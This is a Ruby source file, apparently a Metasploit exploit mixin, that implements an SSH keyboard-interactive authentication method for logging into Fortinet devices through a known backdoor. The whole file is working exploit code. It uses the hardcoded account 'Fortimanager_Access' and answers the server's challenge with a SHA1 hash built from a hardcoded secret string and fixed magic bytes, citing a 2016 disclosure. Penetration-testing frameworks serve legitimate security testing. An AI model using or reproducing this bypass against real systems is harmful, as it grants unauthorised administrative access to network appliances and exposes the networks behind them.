# -*- coding: binary -*-

# https://www.ietf.org/rfc/rfc4256.txt

require 'net/ssh'

module Msf::Exploit::Remote::Fortinet
  class Net::SSH::Authentication::Methods::FortinetBackdoor < Net::SSH::Authentication::Methods::Abstract

    USERAUTH_INFO_REQUEST  = 60
    USERAUTH_INFO_RESPONSE = 61

    def authenticate(service_name, username = 'Fortimanager_Access', password = nil)
      debug { 'Sending SSH_MSG_USERAUTH_REQUEST' }

      send_message(userauth_request(
=begin
        string    user name (ISO-10646 UTF-8, as defined in [RFC-3629])
        string    service name (US-ASCII)
        string    "keyboard-interactive" (US-ASCII)
        string    language tag (as defined in [RFC-3066])
        string    submethods (ISO-10646 UTF-8)
=end
        username,
        service_name,
        'keyboard-interactive',
        '',
        ''
      ))

      loop do
        message = session.next_message

        case message.type
        when USERAUTH_SUCCESS
          debug { 'Received SSH_MSG_USERAUTH_SUCCESS' }
          return true
        when USERAUTH_FAILURE
          debug { 'Received SSH_MSG_USERAUTH_FAILURE' }
          return false
        when USERAUTH_INFO_REQUEST
          debug { 'Received SSH_MSG_USERAUTH_INFO_REQUEST' }

=begin
          string    name (ISO-10646 UTF-8)
          string    instruction (ISO-10646 UTF-8)
          string    language tag (as defined in [RFC-3066])
          int       num-prompts
          string    prompt[1] (ISO-10646 UTF-8)
          boolean   echo[1]
          ...
          string    prompt[num-prompts] (ISO-10646 UTF-8)
          boolean   echo[num-prompts]
=end
          name        = message.read_string
          instruction = message.read_string
          _           = message.read_string

          prompts = []

          message.read_long.times do
            prompt   = message.read_string
            echo     = message.read_bool
            prompts << [prompt, echo]
          end

          debug { 'Sending SSH_MSG_USERAUTH_INFO_RESPONSE' }

          send_message(Net::SSH::Buffer.from(
=begin
            byte      SSH_MSG_USERAUTH_INFO_RESPONSE
            int       num-responses
            string    response[1] (ISO-10646 UTF-8)
            ...
            string    response[num-responses] (ISO-10646 UTF-8)
=end
            :byte,   USERAUTH_INFO_RESPONSE,
            :long,   1,
            :string, custom_handler(name, instruction, prompts)
          ))
        else
          raise Net::SSH::Exception, "Received unexpected message: #{message.inspect}"
        end
      end
    end

    # http://seclists.org/fulldisclosure/2016/Jan/26
    def custom_handler(title, instructions, prompt_list)
      n = prompt_list[0][0]
      m = Digest::SHA1.new
      m.update("\x00" * 12)
      m.update(n + 'FGTAbc11*xy+Qqz27')
      m.update("\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70")
      h = 'AK1' + Base64.encode64("\x00" * 12 + m.digest)
      [h]
    end

  end
end
